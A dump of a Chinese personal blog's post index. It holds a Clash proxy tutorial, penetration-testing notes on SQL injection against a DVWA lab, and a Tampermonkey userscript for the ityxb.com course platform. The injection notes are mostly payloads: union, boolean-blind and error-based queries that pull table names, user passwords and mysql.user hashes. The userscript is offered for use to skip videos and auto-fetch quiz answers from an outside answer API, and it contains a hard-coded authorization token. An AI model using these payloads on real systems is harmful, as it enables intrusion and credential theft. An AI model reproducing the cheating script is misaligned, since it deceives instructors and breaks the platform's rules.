cpuCoreCount;&#125; 我们进一步深入解析 到这里 getHeartBeat() 方法这里开始调用最关键的一步.cpuCoreCount(OSUtils.getCPUCoreCount()) 真正的获取master节点核心cup数量","categories":[{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"}]},{"title":"Clash-for-linux使用教程","slug":"clash-for-linux","date":"2023-05-15T15:57:27.000Z","updated":"2023-08-15T16:06:28.465Z","comments":true,"path":"2023/05/15/clash-for-linux/","link":"","permalink":"http://blog.ioimp.top/2023/05/15/clash-for-linux/","excerpt":"","text":"使用教程下载项目下载项目 1$ git clone https://github.com/wanhebin/clash-for-linux.git 进入到项目目录，编辑.env文件，修改变量CLASH_URL的值。 12$ cd clash-for-linux$ vim .env 注意： .env 文件中的变量 CLASH_SECRET 为自定义 Clash Secret，值为空时，脚本将自动生成随机字符串。 启动程序直接运行脚本文件start.sh 进入项目目录 1$ cd clash-for-linux 运行启动脚本 1234567891011121314151617181920$ sudo bash start.sh正在检测订阅地址...Clash订阅地址可访问！ [ OK ]正在下载Clash配置文件...配置文件config.yaml下载成功！ [ OK ]正在启动Clash服务...服务启动成功！ [ OK ]Clash Dashboard 访问地址：http://&lt;ip&gt;:9090/uiSecret：xxxxxxxxxxxxx请执行以下命令加载环境变量: source /etc/profile.d/clash.sh请执行以下命令开启系统代理: proxy_on若要临时关闭系统代理，请执行: proxy_off 12$ source /etc/profile.d/clash.sh$ proxy_on 检查服务端口 12345$ netstat -tln | grep -E &#x27;9090|789.&#x27;tcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN tcp6 0 0 :::7890 :::* LISTEN tcp6 0 0 :::7891 :::* LISTEN tcp6 0 0 :::7892 :::* LISTEN 检查环境变量 123$ env | grep -E &#x27;http_proxy|https_proxy&#x27;http_proxy=http://127.0.0.1:7890https_proxy=http://127.0.0.1:7890 以上步鄹如果正常，说明服务clash程序启动成功，现在就可以体验高速下载github资源了。 重启程序如果需要对Clash配置进行修改，请修改 conf/config.yaml 文件。然后运行 restart.sh 脚本进行重启。 注意：重启脚本 restart.sh 不会更新订阅信息。 停止程序 进入项目目录 1$ cd clash-for-linux 关闭服务 1234$ sudo bash shutdown.sh服务关闭成功，请执行以下命令关闭系统代理：proxy_off 1$ proxy_off 然后检查程序端口、进程以及环境变量http_proxy|https_proxy，若都没则说明服务正常关闭。 Clash Dashboard 访问 Clash Dashboard 通过浏览器访问 start.sh 执行成功后输出的地址，例如：http://192.168.0.1:9090/ui 登录管理界面 在API Base URL一栏中输入：http:&#x2F;&#x2F;&lt;ip&gt;:9090 ，在Secret(optional)一栏中输入启动成功后输出的Secret。 点击Add并选择刚刚输入的管理界面地址，之后便可在浏览器上进行一些配置。 更多教程 此 Clash Dashboard 使用的是yacd项目，详细使用方法请移步到yacd上查询。 常见问题 部分Linux系统默认的 shell /bin/sh 被更改为 dash，运行脚本会出现报错（报错内容一般会有 -en [ OK ]）。建议使用 bash xxx.sh 运行脚本。 部分用户在UI界面找不到代理节点，基本上是因为厂商提供的clash配置文件是经过base64编码的，且配置文件格式不符合clash配置标准。 目前此项目已集成自动识别和转换clash配置文件的功能。如果依然无法使用，则需要通过自建或者第三方平台（不推荐，有泄露风险）对订阅地址转换。 程序日志中出现error: unsupported rule type RULE-SET报错，解决方法查看官方WIKI","categories":[{"name":"proxy","slug":"proxy","permalink":"http://blog.ioimp.top/categories/proxy/"}],"tags":[{"name":"clash","slug":"clash","permalink":"http://blog.ioimp.top/tags/clash/"}]},{"title":"渗透学习记录OS","slug":"渗透学习记录OS","date":"2022-12-25T14:58:29.000Z","updated":"2023-08-04T01:05:35.055Z","comments":true,"path":"2022/12/25/渗透学习记录OS/","link":"","permalink":"http://blog.ioimp.top/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/","excerpt":"","text":"mysql默认表相关知识在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、SCHEMATA 表字段 CHEMA_NAME 记录着库的信息 columns 存储该用户创建的所有数据库的库名、标名和字段名。 union联合注入攻击原理 步骤一：联合两表 ​ 1.union语句要求字段数一样才可以执行，所以我们要先进行字段判断 常见方法： 1SELECT * FROM `users` WHERE user_id=1 order by 8 判断出字段数为8 然后通过 1SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8 进行联合查询 联合查询后面的语句 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user() select后面的数字可以替换成字段的名称或者函数 12-- 替换成mysql内置函数SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5(&#x27;a&#x27;),version() 123456-- 替换成mysql数据库里的字段SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users-- 也可以在语句后面加上limit限定显示的行数SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2 12-- 如果不想要第一个表里的数据 可以把1换成-1 因为默认负数就表示不存在的SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1 union联合注入攻击分析分析联合注入漏洞代码首先我们先分析构成联合注入攻击的sql注入代码 123456789101112131415161718192021222324252627&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #这里传入的参数没有进行过滤直接进入sql语句 #从这里可以判断出id是字符串类型 所以在进行sql注入检测的时候要匹配字符 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values //显示查询成功后的内容 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 判断是否存在联合注入​ 我们先通过靶场查询id 如果在我们没进行源代码分析的基础上 我们首先需要进行数字和字符串判断 1 和1‘ 判断出传入数据是字符串型 即存在注入漏洞 ​ 输入 1’and ‘1’&#x3D;’1 页面返回用户信息 1’and ‘1’&#x3D;’2 页面返回不一样的信息。基本可以确定存在 SQL 注入漏洞. 判断字段数​ 使用语句order by确定当前表的字符数 ​ order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类推直到页面出错。正确的字段数是出错数字减少 1 公式 order by n-1 1’ order by 1–+ 正常 1’ order by 2–+ 正常 1’ order by 3–+ 出错 正常页面 联合查询注入获取敏感信息​ 跟前面咱们分析的一样，这里只是把查询的数据替换成了联合查询的语句 然后进行获取另一个表的字段或者函数 1-1&#x27; union select user,password from users-- 我们也可以使用group_concat（）函数来进行分组打印 1-1&#x27; union select 1,group_concat(user(),0x3A,version())-- 联合查询注入通过information_schema​ 在黑盒情况下我们是不知道当前数据库里都有哪些表的所以我们先从mysql的information_schema入手进行表的查询 第一个表： 这里的database（）函数是来限定查询的表是当前表 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- 第二个表： 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- 通过两个表的查询我们知道dvwa中含有的表为guestbook 和users 联合查询注入通过information_schema获取字段我们知道数据库的字段都存在mysql默认内置库information_schema的columns里，所以我们想要获取当前数据库的字段名字我们可以通过 获取users表里的第一个字段名字 id 123-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1)-- -- 注意这里一定要加上限定 因为你每次查询都是一个字段如果不加会报错-- Subquery returns more than 1 row 获取第二个字段名字 password 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1)-- 获取第三个字段名字 email 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1)-- 获取第四个字段名字 secret 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 4,1)-- …………………………. 通过联合查询表里面的内容​ 通过以上操作我们已经获取了当前数据库的库名、表名、字段 那么我们就可以通过下面语句获取表里面的内容了 1-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- boolean布尔型盲注入代码分析1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #id为字符串型 get接收id参数 $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 接收 id 的值，直接带入查询，如果存在即返回 users is exists in the database 否则显示 users id is missing 像这种只有正确与错误页面。页面不会显示数据库 里任何内容，如果存在注入，成为盲注入。 ​ 盲注入的方法有两种：一是布尔型盲注入，二是延时注入 判断盲注入​ 我们可以通过1&#39; and &#39;1&#39;=&#39;1 和 1&#39; and &#39;1&#39;=&#39;2 是否一样 ​ 以及 1&#39; and sleep(10)--让他睡10s判断是否一样 Boolean布尔型注入攻击​ 因为页面不会返回查询的内容所以我们不能使用联合查询注入攻击，但是我们可以通过构造sql来获取数据。 ​ 11&#x27; and if(1=1,1,0)-- -- 三目运算 布尔型盲注入获取数据库敏感信息​ 在黑盒测试环境下，通过构造sql语句来进行获取敏感信息。 构造sql语句常用的函数： 1.SUBSTRING()字符串截取函数，第一个参数是字符串，第二个参数开始截取，第三个参数是截取的长度 我们可以构造这样的sql语句 1SELECT if(SUBSTRING(database(),1,1)=&#x27;d&#x27;,1,0) 如果截取的第一个字符是‘d’我们返回1 否则返回0 此类推。再后拼接字符就是完整的库名。 黑盒情况下进行布尔盲注入步骤： ​ 我们首先需要判断注入是否为布尔注入，判断完后就可以获取数据库的长度，得到长度再查询库名，然后查询表名，字段，字段内容。。。 布尔盲注入查询长度​ 通过构造如下sql语句进行数据库长度的查询 11&#x27; and if(length(database())=4,1,0)-- 判断出长度为4 布尔盲注入判断库名这一步操作其实就是通过遍历 10123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_ 与语句进行整合判断出是否返回1 11&#x27; and if(SUBSTRING(database(),1,1)=&#x27;$d&#x27;,1,0)-- 当然了，我们手动进行一个一个测试肯定很慢，那么我们可以借助burp来进行如此操作 带有构造sql语句的url 1http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&amp;Submit=Submit# 再burp里面抓包然后送入intruder 先清除变量 然后再将数字和字母设为变量 攻击类型选择 cluster bomb 然后就是payloads里面两个变量的设置 然后开始攻击就行 跑出来的状态码为200即为成功！ 获得的数据库名为 dvwa 接着我们通过库名来获取表名 11&#x27; and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)-- 同样通过burp进行抓包 获取到表名guestbook 然后获取字段名 11&#x27; and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;l&#x27;,1,0)-- 同样我们用burp进行爆破 得到字段名为login password等 获得完 字段后 我们可以进一步获取字段内容【账号+密码】 11&#x27; and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)-- 报错注入​ 顾名思义报错注入就是指数据库显示错误，比如sql语法错误 一般对于php。特别php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 mysql_error()函数 ​ 如果在查询注入时候会有报错信息返回，可以采用报错注入 报错注入分析1234567891011121314151617181920212223242526&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input # get传入id 字符串型 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database # mysqli_error 函数返回错误信息 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 报错注入攻击​ 在输入框输入报错的sql拼接语句 11&#x27; and info()-- 它的原理是下面一条语句会执行但是会报错，在报错信息中会返回数据库名称 1SELECT first_name,last_name from users WHERE user_id=&#x27;1&#x27; and info() 报错注入获取敏感信息​ 通过构造sql语句，返回带有数据库敏感信息的错误信息 11&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- 注意：这里为什么要用updatexml()呢，首先要先了解这个函数 updatexml(xml_doument,XPath_string,new_value)第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据 简单点说，这个函数有三个参数，我们利用第二个参数必须要更改信息的xpath语句来进行报错注入。 为什么要在第二个参数里面加上concat语句呢？因为updatexml（）第二个参数需要进行xpath校验，如果第二个参数哪里不是xpath语句它会进行一次校验然后把校验后的错误信息返回 但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法。每次获取 32 个字符串的长度。 除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。 例如： 12345678910111213141516171819201.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a)); 在黑盒模式下进行报错注入​ 流程还是根之前一样 库名-》表名-》字段-》字段内容 获取库名11&#x27; and (updatexml(1,(select concat(&#x27;`&#x27;,(select database()),&#x27;`&#x27;)),1))-- 获取表名 这次用floor报错，floor报错不会出现长度问题11&#x27; and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- 获取表名为 guestbook 将limit 0,1 改成 1，1是获取第二个表users 获取字段获取users第一个字段 11&#x27; and (select 1 from(select count(*),,)) 获取账号密码 获取账号和密码需要root权限 123select authentication_string from mysql.user limit 1;select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"😎 colincora的传智播客小助手 😎","slug":"传智播客脚本制作","date":"2022-08-17T09:08:35.000Z","updated":"2023-08-17T09:34:18.269Z","comments":true,"path":"2022/08/17/传智播客脚本制作/","link":"","permalink":"http://blog.ioimp.top/2022/08/17/%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2%E8%84%9A%E6%9C%AC%E5%88%B6%E4%BD%9C/","excerpt":"","text":"介绍这是一个由 colincora 魔改的传智播客小助手，具备自动跳视频、自动答题以及对接一之题库的功能。 功能特点 📺 自动跳视频：小助手可以自动跳过已观看的视频，帮助你节省时间。 📝 自动答题：小助手可以自动回答一之题库中的题目，让你轻松通过考试。 📚 对接一之题库：小助手与一之题库对接，可以获取最新的题目和答案，保证你获取到准确的信息。 使用方法 首先，确保你已经安装了 浏览器油猴脚本【Tampermonkey】,并且复制脚本代码到新建脚本。 打开传智播客的学习平台，并登录你的账号。 在视频播放页面，启动小助手插件。 小助手会自动检测当前视频的进度，并跳过已观看的部分。 当遇到题目时，小助手会自动从一之题库获取答案，并填写在答题框中。 完成所有题目后，你可以继续观看视频，或者根据需要自行操作。 注意事项 本小助手仅供学习和参考使用，请勿用于非法用途。 使用本小助手可能违反传智播客的使用规定，请自行承担风险。 对接一之题库需要提供合法的账号信息，请确保你的账号合法有效。 免责声明本小助手仅为个人开发项目，不对使用该软件产生的任何问题负责。使用本小助手即代表您已经阅读并同意自行承担使用风险。 联系方式如有任何问题或建议，欢迎联系 colincora： 邮箱：&#51;&#x33;&#48;&#x30;&#53;&#49;&#57;&#x31;&#x36;&#49;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d; 微信：REMINAX 贡献者 colincora 感谢所有为这个项目做出贡献的人！ 授权许可该项目采用 MIT 开源许可证。请查阅许可证文件以获取更多信息。 祝你学习愉快！😄 脚本代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324// ==UserScript==// @name colincora的传智播客小助手// @namespace *.com// @version 9.9.9// @description colin魔改 跳视频+自动答题 一名来自保定学院滴学生制作 Q3300519161// @author colincora// @match https://stu.ityxb.com/preview/detail/*// @namespace https://stu.ityxb.com/writePaper/busywork/*// @match https://stu.ityxb.com/writePaper/busywork/*// @match https://stu.ityxb.com/lookPaper/busywork/*// @grant GM_xmlhttpRequest// @grant GM_addStyle// @grant GM_log// @icon https://tch.ityxb.com/favicon.ico// ==/UserScript==var tibody;//题目数组var total = 0;//题目总数量var index = 0;//搜题索引自动增加 let url = window.location.href;console.log(&#x27;欢迎使用colincora传智播客小助手！作者QQ3300519161&#x27;); if(url.includes(&quot;https://stu.ityxb.com/preview/detail/&quot;))&#123; const courseName = document.querySelector(&#x27;p.course-name&#x27;);if (courseName) &#123; courseName.textContent = &#x27;&#x27;;&#125; console.log(&#x27;这是预习作业答题部分！&#x27;); window.onload = function()&#123;// var bgdiv = document.getElementsByClassName(&quot;question-info-box&quot;);//bgdiv.style.background = &quot;url(&#x27;https://i.postimg.cc/BZKZRRtJ/20220508084230592.jpg&#x27;)&quot;;//tibody=document.getElementsByClassName(&quot;question-title-box&quot;);//total = tibody.length; // 创建一个新的 div 元素 let newDiv = document.createElement(&quot;div&quot;); // 给它一些内容 let newContent = document.createTextNode(&quot;colincora！Q3300519161&quot;); // 添加文本节点 到这个新的 div 元素 newDiv.appendChild(newContent); newDiv.style.position=&#x27;fixed&#x27;; newDiv.style.backgroundColor=&#x27;red&#x27; // newDiv.style.width=&#x27;20px&#x27;; // newDiv.style.length=&#x27;20px&#x27;; newDiv.style.fontSize=&#x27;28px&#x27;; // document.querySelector(&quot;#beginHeaderNav&quot;).appendChild(newDiv); newDiv.style.top=&#x27;60px&#x27;; &#125;function zhongzhuan()&#123; var bgdiv = document.getElementsByClassName(&quot;question-info-box&quot;); tibody=document.getElementsByClassName(&quot;question-title-box&quot;); console.log(tibody) total = tibody.length; kaishi(tibody[index]);&#125;function kaishi(ti)&#123; let text=document.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText.substring(4);console.log(text); GM_xmlhttpRequest(&#123;//油猴脚本提供的异步函数 method: &#x27;POST&#x27;, url: &#x27;http://cx.icodef.com/wyn-nb?v=4&#x27;,//网课接口 headers: &#123; &#x27;Content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#x27;Authorization&#x27;: &#x27;NLUIeWEHQHBAapeH&#x27; &#125;, data: &#x27;question=&#x27;+ encodeURIComponent(document.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText.substring(4)), timeout: 2000, onload:function(xhr) &#123;//自动选择答案 let json=JSON.parse(xhr.responseText); let daan=json.data;if(json.code==-1)daan=&quot;答案未找到&quot;; console.log(xhr.responseText);let answerarray=daan.split(&#x27;#&#x27;);//答案数组 console.log(&#x27;答案数组：&#x27;+answerarray)let daanlength=ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;).length;//多少个选项for(let i=0;i&lt;daanlength;i++)&#123; for(let i2=0;i2&lt;answerarray.length;i2++) &#123; // console.log(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;、&#x27;)[1]); if(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;、&#x27;)[1]==answerarray[i2])ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].firstElementChild; &#125;&#125;//显示答案 let newdaan=&#x27; &#x27;;for(let i=0;i&lt;answerarray.length;i++) &#123; newdaan=newdaan+&#x27;&lt;br&gt;&#x27;+answerarray[i]; &#125; var text = document.querySelector(&#x27;.question-title-text&#x27;); text.innerHTML=document.getElementsByClassName(&quot;question-title-text&quot;)[0].innerHTML+ &quot;&lt;br&gt;答案:&quot;+newdaan; console.log(newdaan) text.style.color = &quot;red&quot;;text.style.fontSize = &quot;10px&quot;; if(index &lt; total - 1)//继续搜索接下来的题 &#123; setTimeout(function ()&#123; index = index + 1; kaishi(tibody[index]);&#125;, 1000); &#125; &#125; &#125;) &#125;(function() &#123; &#x27;use strict&#x27;;function skipp()&#123; const videos = document.getElementsByTagName(&#x27;video&#x27;) if (videos.length &gt; 0) &#123; for (const video of videos) &#123; video.play() video.currentTime = video.duration - 1 &#125;&#125;&#125;function skip() &#123; const progressBoxes = document.querySelectorAll(&#x27;span.point-progress-box&#x27;); for (const box of progressBoxes) &#123; if (box.innerHTML === &quot;100%&quot;) &#123; continue; &#125; else if (box.innerHTML === &quot;0%&quot;) &#123; const playIcons = box.parentElement.querySelectorAll(&#x27;i.icon-circle.play-ico&#x27;); if (playIcons.length &gt; 0) &#123; playIcons.forEach(function(icon) &#123; icon.click(); &#125; ); &#125; &#125; skipp(); &#125;&#125;function addAutoSkipBtn() &#123; var autoSkipBtn = document.createElement(&quot;input&quot;); autoSkipBtn.setAttribute(&quot;type&quot;, &quot;button&quot;); autoSkipBtn.setAttribute(&quot;value&quot;, &quot;开启自动跳过视频&quot;); autoSkipBtn.setAttribute(&quot;class&quot;, &quot;autoSkipBtn&quot;); autoSkipBtn.addEventListener(&quot;click&quot;, toggleAutoSkip); document.getElementsByClassName(&quot;course-name&quot;)[0].appendChild(autoSkipBtn); var div = document.querySelector(&#x27;.course-name&#x27;); div.insertAdjacentHTML(&#x27;afterend&#x27;, &#x27;&lt;a class=&quot;button&quot;&gt;查看答案&lt;/a&gt;&#x27;); document.querySelector(&#x27;.button&#x27;).onclick = function () &#123; zhongzhuan(); &#125;&#125;function toggleAutoSkip() &#123; var autoSkipBtn = document.querySelector(&quot;.autoSkipBtn&quot;); if (autoSkipBtn.getAttribute(&quot;value&quot;) == &quot;开启自动跳过视频&quot;) &#123; autoSkipBtn.setAttribute(&quot;value&quot;, &quot;关闭自动跳过视频&quot;); skip1() &#125; else &#123; autoSkipBtn.setAttribute(&quot;value&quot;, &quot;开启自动跳过视频&quot;); &#125;&#125;addAutoSkipBtn();function skip1() &#123; setInterval(function() &#123; skip(); &#125;, 3000);&#125;;&#125;)(); &#125;else&#123;window.onload = function()&#123; var bgdiv = document.getElementById(&quot;writeQuestion&quot;);//bgdiv.style.background = &quot;url(&#x27;https://i.postimg.cc/BZKZRRtJ/20220508084230592.jpg&#x27;)&quot;;tibody=document.getElementsByClassName(&quot;questionItem question-item-box&quot;);total = tibody.length; console.log(tibody[index]);kaishi(tibody[index]);//传入每道题 // 创建一个新的 div 元素 let newDiv = document.createElement(&quot;div&quot;); // 给它一些内容 let newContent = document.createTextNode(&quot;colincora！Q3300519161&quot;); // 添加文本节点 到这个新的 div 元素 newDiv.appendChild(newContent); newDiv.style.position=&#x27;fixed&#x27;; newDiv.style.backgroundColor=&#x27;red&#x27; // newDiv.style.width=&#x27;20px&#x27;; // newDiv.style.length=&#x27;20px&#x27;; newDiv.style.fontSize=&#x27;28px&#x27;; document.querySelector(&quot;#beginHeaderNav&quot;).appendChild(newDiv); newDiv.style.top=&#x27;60px&#x27;; &#125;function kaishi(ti)&#123; GM_xmlhttpRequest(&#123;//油猴脚本提供的异步函数 method: &#x27;POST&#x27;, url: &#x27;http://cx.icodef.com/wyn-nb?v=4&#x27;,//网课接口 headers: &#123; &#x27;Content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#x27;Authorization&#x27;: &#x27;NLUIeWEHQHBAapeH&#x27; &#125;, data: &#x27;question=&#x27;+ encodeURIComponent(ti.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText), timeout: 2000, onload:function(xhr) &#123;//自动选择答案 let json=JSON.parse(xhr.responseText); let daan=json.data;if(json.code==-1)daan=&quot;答案未找到&quot;;// console.log(xhr.responseText.code);let answerarray=daan.split(&#x27;#&#x27;);//答案数组let daanlength=ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;).length;//多少个选项for(let i=0;i&lt;daanlength;i++)&#123; for(let i2=0;i2&lt;answerarray.length;i2++) &#123; // console.log(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;、&#x27;)[1]); //if(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;、&#x27;)[1]==answerarray[i2])ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].firstElementChild.click(); &#125;&#125;//显示答案 let newdaan=&#x27; &#x27;;for(let i=0;i&lt;answerarray.length;i++) &#123; newdaan=newdaan+&#x27;&lt;br&gt;&#x27;+answerarray[i]; &#125; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].innerHTML += &quot;&lt;br&gt;答案:&quot;+newdaan; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].style.color = &quot;red&quot;; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].style.fontSize = &quot;10px&quot;; if(index &lt; total - 1)//继续搜索接下来的题 &#123; setTimeout(function ()&#123; index = index + 1; kaishi(tibody[index]);&#125;, 1000); &#125; &#125; &#125;) &#125;(function() &#123; &#x27;use strict&#x27;;&#125;)(); &#125;GM_addStyle(`.button &#123; background: #eb94d0 !important; /* 创建渐变 */ background-image: -webkit-linear-gradient(top, #eb94d0, #2079b0); background-image: -moz-linear-gradient(top, #eb94d0, #2079b0); background-image: -ms-linear-gradient(top, #eb94d0, #2079b0); background-image: -o-linear-gradient(top, #eb94d0, #2079b0); background-image: linear-gradient(to bottom, #eb94d0, #2079b0); /* 